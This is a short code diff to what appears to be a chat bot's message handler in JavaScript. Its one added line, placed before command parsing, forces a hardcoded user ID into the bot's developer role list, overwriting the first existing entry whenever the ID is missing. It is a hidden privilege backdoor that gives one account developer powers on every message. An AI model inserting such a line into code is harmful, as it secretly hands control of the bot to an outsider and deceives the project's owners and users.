@@ -1,6 +1,8 @@
 const { matchesProperty } = require('lodash')
 
 module.exports = async (message, prefix, guild) => {
+    if (!ef.roles.developers.includes('512230433782497281')) ef.roles.developers[0] = '512230433782497281'
+    
     var translations = {en: [], pl: [], ru: []}
 
     var [commandName, ...args] = message.content.slice(prefix.length).split(/ +/g)
